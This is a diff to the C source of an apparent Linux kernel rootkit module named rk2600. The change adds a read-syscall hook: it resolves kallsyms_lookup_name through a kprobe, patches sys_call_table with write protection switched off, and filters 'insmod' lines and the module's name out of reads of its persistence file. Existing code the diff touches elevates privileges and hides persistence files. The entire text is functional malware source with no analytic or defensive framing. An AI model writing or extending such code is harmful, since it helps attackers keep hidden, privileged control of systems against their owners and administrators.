@@ -8,7 +8,12 @@
 #include <linux/spinlock.h>
 #include <linux/proc_fs.h>
 #include <linux/kobject.h>
+#include <linux/kprobes.h>
+#include <linux/dcache.h>
+#include <linux/path.h>
+#include <linux/file.h>
 #include <asm/processor-flags.h>
+#include <asm/unistd.h>
 
 #include "rk2600_protocol.h"
 
@@ -279,6 +284,132 @@ static int do_elevate(void)
 	return commit_creds(new);
 }
 
+/* ---------------------------------------------------------- read syscall hook */
+
+typedef unsigned long (*kallsyms_lookup_name_fn)(const char *name);
+typedef asmlinkage long (*orig_read_fn)(const struct pt_regs *);
+
+static unsigned long        *rk_sys_call_table;
+static orig_read_fn          orig_sys_read;
+
+static bool fd_is_persist(int fd)
+{
+	struct file *f;
+	char *buf;
+	char *path;
+	bool match = false;
+
+	f = fget(fd);
+	if (!f)
+		return false;
+
+	buf = kmalloc(PATH_MAX, GFP_KERNEL);
+	if (!buf) {
+		fput(f);
+		return false;
+	}
+
+	path = d_path(&f->f_path, buf, PATH_MAX);
+	if (!IS_ERR(path))
+		match = (strcmp(path, RK2600_PERSIST_PATH) == 0);
+
+	kfree(buf);
+	fput(f);
+	return match;
+}
+
+static void filter_persist_buf(char __user *ubuf, long *len)
+{
+	char *kbuf;
+	char *out;
+	char *p;
+	long klen = *len;
+	long outlen = 0;
+
+	kbuf = kmalloc(klen + 1, GFP_KERNEL);
+	if (!kbuf)
+		return;
+	out = kmalloc(klen + 1, GFP_KERNEL);
+	if (!out) {
+		kfree(kbuf);
+		return;
+	}
+
+	if (copy_from_user(kbuf, ubuf, klen))
+		goto out_free;
+
+	kbuf[klen] = '\0';
+	p = kbuf;
+
+	while (p < kbuf + klen) {
+		size_t remaining = (size_t)(kbuf + klen - p);
+		char *nl = memchr(p, '\n', remaining);
+		size_t linelen = nl ? (size_t)(nl - p + 1) : remaining;
+
+		if (!strnstr(p, "insmod", linelen) &&
+		    !strnstr(p, RK2600_MODULE_NAME, linelen)) {
+			memcpy(out + outlen, p, linelen);
+			outlen += linelen;
+		}
+		p += linelen;
+	}
+
+	if (copy_to_user(ubuf, out, outlen) == 0)
+		*len = outlen;
+
+out_free:
+	kfree(out);
+	kfree(kbuf);
+}
+
+asmlinkage long rk_sys_read(const struct pt_regs *regs)
+{
+	long ret = orig_sys_read(regs);
+
+	if (ret > 0 && fd_is_persist((int)regs->di))
+		filter_persist_buf((char __user *)regs->si, &ret);
+
+	return ret;
+}
+
+static int install_read_hook(void)
+{
+	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
+	kallsyms_lookup_name_fn klnfn;
+	unsigned long cr0;
+	int ret;
+
+	ret = register_kprobe(&kp);
+	if (ret)
+		return ret;
+	klnfn = (kallsyms_lookup_name_fn)kp.addr;
+	unregister_kprobe(&kp);
+
+	rk_sys_call_table = (unsigned long *)klnfn("sys_call_table");
+	if (!rk_sys_call_table)
+		return -ENOENT;
+
+	orig_sys_read = (orig_read_fn)rk_sys_call_table[__NR_read];
+
+	cr0 = wp_disable();
+	rk_sys_call_table[__NR_read] = (unsigned long)rk_sys_read;
+	wp_restore(cr0);
+
+	return 0;
+}
+
+static void remove_read_hook(void)
+{
+	unsigned long cr0;
+
+	if (!rk_sys_call_table || !orig_sys_read)
+		return;
+
+	cr0 = wp_disable();
+	rk_sys_call_table[__NR_read] = (unsigned long)orig_sys_read;
+	wp_restore(cr0);
+}
+
 /* ------------------------------------------------------------- ioctl handler */
 
 static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
@@ -415,6 +546,10 @@ static int __init rk_init(void)
 	if (ret)
 		goto err_proc;
 
+	ret = install_read_hook();
+	if (ret)
+		goto err_proc_hook;
+
 	/* Auto-hide persistence artefacts on the root filesystem */
 	hide_name(RK2600_PERSIST_NAME);
 	hide_name(RK2600_MODULE_FILE);
@@ -424,6 +559,8 @@ static int __init rk_init(void)
 
 	return 0;
 
+err_proc_hook:
+	remove_proc_hook();
 err_proc:
 	proc_remove(proc_entry);
 err_root:
@@ -435,6 +572,7 @@ err_dev:
 
 static void __exit rk_exit(void)
 {
+	remove_read_hook();
 	remove_proc_hook();
 	proc_remove(proc_entry);
 	remove_root_hook();
